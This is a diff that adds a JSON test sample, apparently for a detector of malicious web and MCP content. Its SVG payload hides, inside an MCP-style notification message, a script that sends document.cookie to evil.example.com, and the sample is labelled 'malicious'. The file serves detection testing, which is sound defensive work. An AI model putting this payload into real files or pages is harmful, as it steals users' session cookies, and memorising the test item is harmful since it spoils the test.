@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::webmcp-detector::59::binary-variations::1",
+  "base_sample_id": "exp::webmcp-detector::59",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 1433559477,
+  "content": "<svg xmlns=\"http://www.w3.org/2000/svg\"><desc>{\"method\":\"notifications/message\",\"params\":{\"content\":\"<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>\"}}\n</desc><rect width=\"100\" height=\"100\"/></svg>",
+  "content_hash": "17926bb8b22032ca257da40752931c257f016609242c5be76dd7a6c6c4d22fcf",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:svg",
+  "difficulty": "advanced"
+}
